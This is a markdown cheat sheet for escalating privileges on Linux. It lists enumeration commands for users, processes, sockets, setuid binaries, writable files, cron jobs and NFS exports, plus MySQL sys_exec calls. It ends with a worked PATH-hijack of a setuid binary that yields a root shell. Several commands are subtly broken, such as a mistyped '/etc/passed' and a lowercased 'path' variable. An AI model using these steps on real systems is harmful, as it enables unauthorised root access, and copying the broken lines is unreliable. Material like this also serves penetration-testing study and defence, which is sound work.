# elevate linux

## what's the os? what version? what architecture?

    cat /etc/*-release
    uname -i
    lsb_release -a (debian based oss)

## who are we? where are we?

    id
    pwd

## who uses the box? what users? (and which ones have a valid shell)

    cat /etc/passwd
    grep -ve "nologin|false" /etc/passwd

## what's currently running on the box? what active network services are there?

    ps aux
    netstat -antup
    ss -ltpa

## what's installed? what kernel is being used?

    dpkg -l (debian based oss)
    rpm -qa (centos / opensuse )
    uname -a

## who are the current users?

    cat /etc/passwd
    cat /etc/passwd | egrep -e '/bin/(ba)?sh'

## what are the low hanging fruits?

    # if the gods are on your side
    sudo su

    # check for sudo privs
    sudo -l

    # view permissions on passwd
    ls -l /etc/passed

    # view permissions on shadow
    ls -l /etc/shadow

    # check for cron jobs
    cat /etc/crontab

    # check for kernel priv-esc exploits
    uname -a
    cat /etc/issue

    # check /home persmissions
    ls -la /home

    # check /root persmissions
    ls -l /root

    # setuid binaries
    ## look for - nmap,vim,find,bash,more,less,nano,cp,man
    find / -user root -perm -4000 -exec ls -ldb {} \;

    # user writable files
    find / -type f ( ! -path "/proc" ) -writable 2>/dev/null | xargs ls -l

    # check for nfs shares: if writeable, add /root, restart, and mount
    cat /etc/exports

## what are the files we have access to?

    # check for world writeable files
    find / -path /sys -prune -o -path /proc -prune -o -type f -perm -o=w -ls 2> /dev/null

    #check for world writeable directories
    find / -path /sys -prune -o -path /proc -prune -o -type d -perm -o=w -ls 2> /dev/null

    #look for interesint files:
    find / -name "*.txt" -ls 2> /dev/null
    find / -name "*.log" -ls 2> /dev/null

## what are the processes running as root?

    ps -aux | grep root

## what are the processes with open and listening sockets:

    netstat -a | grep -i listen
    netstat -ano
    ss -ltpa

## who is running the database?

    # mysql
    select sys_exec('whoami');
    select sys_eval('whoami');

## what are the boot processes?

    ls /etc/rc*

## setuid

    # after setting a setuid bit on a binary such as bash, in order to retain the setuid privs, you must supply the -p flag:
    ./bash -p

    # overwrite used binary by bash
    $ ls -l /usr/local/bin/docker-security
    -rwsr-xr-x 1 root mortal 16720 feb 15 20:00 /usr/local/bin/docker-security
    $ cd /usr/local/bin/
    $ echo "/bin/bash" > /tmp/chmod
    $ chmod 777 /tmp/chmod
    $ export path=/tmp:$path
    $ echo $path
    /tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/snap/bin
    $ ./docker-security
    # id
    uid=0(root) gid=0(root) groups=0(root)
